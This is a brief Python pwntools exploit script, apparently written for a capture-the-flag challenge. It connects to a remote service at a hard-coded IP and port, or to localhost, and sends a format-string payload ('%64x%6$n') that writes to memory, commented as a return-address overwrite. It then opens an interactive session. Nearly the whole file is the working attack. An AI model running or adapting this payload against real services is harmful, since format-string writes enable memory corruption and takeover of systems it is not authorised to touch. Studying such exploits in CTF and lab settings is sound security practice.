from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('35.201.132.60',50216)
else:
    r = remote('localhost',8888)

#ret addr
s = '%64x%6$n'
r.send(s)
r.interactive()
